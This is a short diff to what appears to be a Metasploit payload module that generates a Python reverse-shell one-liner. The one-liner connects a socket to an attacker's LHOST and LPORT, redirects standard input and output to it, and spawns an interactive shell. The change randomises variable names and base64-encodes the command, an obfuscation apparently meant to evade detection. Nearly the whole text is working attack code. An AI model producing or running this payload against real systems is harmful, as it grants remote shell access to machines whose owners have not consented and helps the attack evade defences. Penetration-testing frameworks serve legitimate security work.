@@ -42,8 +42,12 @@ module Metasploit3
   #
 
   def command_string
-	raw_cmd = "import socket,os;s=socket.socket();s.connect((\"#{datastore['LHOST']}\",#{datastore['LPORT']}));h=s.fileno();d=os.dup2;d(h,0);d(h,1);d(h,2);os.execl(\"#{datastore['SHELL']}\",\"-i\")"
-    "python -c'#{raw_cmd}'"
+	sname =(97+rand(23)).chr
+	dname = (sname.ord + 1).chr
+	hname = (sname.ord + 2).chr
+	raw_cmd = "import socket,os;#{sname}=socket.socket();#{sname}.connect((\"#{datastore['LHOST']}\",#{datastore['LPORT']}));#{hname}=#{sname}.fileno();#{dname}=os.dup2;#{dname}(#{hname},0);#{dname}(#{hname},1);#{dname}(#{hname},2);os.execl(\"#{datastore['SHELL']}\",\"-i\")"
+	encoded_cmd = Rex::Text.encode_base64(raw_cmd)
+    "python -c'exec(\"#{encoded_cmd}\".decode(\"base64\"))'"
   end
 
 end
